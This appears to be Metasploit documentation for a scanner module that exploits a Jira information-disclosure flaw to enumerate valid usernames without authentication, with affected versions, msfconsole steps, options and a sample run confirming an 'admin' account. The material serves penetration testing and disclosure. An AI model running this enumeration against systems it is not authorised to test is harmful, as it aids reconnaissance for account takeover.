## Vulnerable Application

  [Jira](https://www.atlassian.com/software/jira) Jira is team managment software for agile teams.

  This module has been tested successfully on:

   * Jira version 8.4.1 on Ubuntu Linux.
   * Jira version 8.4.1 on Kali Linux.
   * Jira version 8.5.6 on Ubuntu Linux.
   * Jira version 8.10.1 on Ubuntu Linux.
   * Jira version 8.11.0 on Ubuntu Linux

  Installers:

  * [Jira Installers](https://www.atlassian.com/software/jira/core/updateatlassian-jira-software-8.4.1.tar.gz)
  * [Jira Installers Archive] (https://www.atlassian.com/software/jira/download-archives)

### Description

  The module exploits an information disclosure vulnerability to allow an unauthenticated user to enumerate /ViewUserHover.jspa endpoint.
  This only affects Jira versions < 7.13.16, 8.0.0 ≤ version < 8.5.7, 8.6.0 ≤ version < 8.11.1
  Discovered by Mikhail Klyuchnikov @__mn1__
  https://twitter.com/ptswarm/status/1318914772918767619

## Verification Steps

  1. Start `msfconsole`
  2. Do: `use auxiliary/scanner/http/jira_user_enum`
  3. Do: `set rhosts [IP]`
  4. Do: `set SSL true`
  5. Do: `set RPORT 443`
  6. Do: `set USERNAME <username to test>
  7. Do: `run`
  8. You should find out if the user exists or not


## Options

- BRUTEFORCE_SPEED - How fast to bruteforce, from 0 to 5
- RHOSTS - The Target host(s)
- RPORT - Remote port hosting the Jira Application
- TAREGETURI - Path to Jira install on the webserver
- USERNAME - single username to attempt to enumerate
- USER_FILE - File of usernames to attempt to enumerate


## Scenarios

```
  msf6 > use auxiliary/scanner/http/jira_enum_users 
  msf6 auxiliary(scanner/http/jira_enum_users) > set rhosts 192.168.0.101
  rhosts => 192.168.0.101
  msf6 auxiliary(scanner/http/jira_enum_users) > set USERNAME admin
  msf6 auxiliary(scanner/http/jira_enum_users) > run

  [*] Begin enumerating users at 192.168.0.101/secure/ViewUserHover.jspa?username=
  [*] checking user admin
  [+] 'User exists: admin'
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  msf6 auxiliary(scanner/http/jira_enum_users) > creds
  Credentials
  ===========

  host           origin         service         public   private  realm  private_type  JtR Format
  ----           ------         -------         ------   -------  -----  ------------  ----------
  192.168.0.101  192.168.0.101  443/tcp (jira)  admin                                

```
